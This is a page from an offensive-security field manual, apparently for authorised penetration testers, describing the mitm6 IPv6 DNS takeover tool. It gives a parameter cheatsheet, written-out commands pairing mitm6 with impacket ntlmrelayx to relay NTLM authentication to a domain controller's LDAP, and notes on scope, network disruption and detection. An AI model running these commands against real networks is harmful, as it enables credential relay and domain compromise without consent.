---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
  tags:
    visible: true
---

# mitm6

`mitm6` is a Python-based exploitation tool designed to automate the [ipv6-dns-takeover.md](../../../field-manual/exploitation/man-in-the-middle/ipv6-dns-takeover.md "mention") attack. It is optimised to work in tandem with [impacket](../post-exploitation/impacket/ "mention") `ntlmrelayx`.

It listens on a primary interface, detects the local network settings, and selectively spoofs DHCPv6 and DNS replies.

{% hint style="info" %}
#### Download & Install

[https://github.com/dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
{% endhint %}

***

## Cheatsheet

{% tabs %}
{% tab title="Parameters" %}
<table><thead><tr><th width="157">Parameter</th><th>Description</th><th>Usage</th></tr></thead><tbody><tr><td><p><code>-i</code></p><p><code>--interface</code></p></td><td>Specifies the network interface to use.</td><td>Always specify to avoid spoofing on the wrong segment.</td></tr><tr><td><p><code>-d</code></p><p><code>--domain</code></p></td><td>Filter to only attack a specific AD domain.</td><td>Critical for Scope: Use this to avoid affecting the "out-of-scope" remote network.</td></tr><tr><td><p><code>-l</code></p><p><code>--localdomain</code></p></td><td>The search domain sent to clients.</td><td>Usually matches the AD domain name.</td></tr><tr><td><p><code>-wh</code></p><p><code>--hw</code></p></td><td>Filter DHCPv6 queries by hostname (Allowlist).</td><td>Use for surgical testing of specific Windows 11 laptops.</td></tr><tr><td><code>--ignore-nofqdn</code></td><td>Ignores queries that don't have a full domain name.</td><td>Reduces "noise" and potential network instability.</td></tr><tr><td><code>--no-ra</code></td><td>Disables Router Advertisements.</td><td>Useful if the network has RA Guard enabled but not DHCP Guard.</td></tr></tbody></table>
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

***

## Standard Workflow

{% stepper %}
{% step %}
### Start the Relay

{% code overflow="wrap" %}
```bash
impacket-ntlmrelayx -6 -wh fakewpad.target.local -t ldap://[DC_IP] -l ./loot
```
{% endcode %}
{% endstep %}

{% step %}
### Start mitm6

{% code overflow="wrap" %}
```bash
mitm6 -i eth0 -d target.local
```
{% endcode %}
{% endstep %}
{% endstepper %}

***

## Limitations & Risks

### Network Instability

mitm6 assigns a 300-second (5-minute) lease. If the tool is stopped abruptly, victims may lose DNS connectivity until the lease expires.

### Performance

In large networks, mitm6 can be "noisy." It is best used in short bursts (15–30 minutes) rather than running it for an entire day.

### Detection

It is highly visible to any SOC monitoring for rogue DHCP servers or unexpected IPv6 traffic spikes.
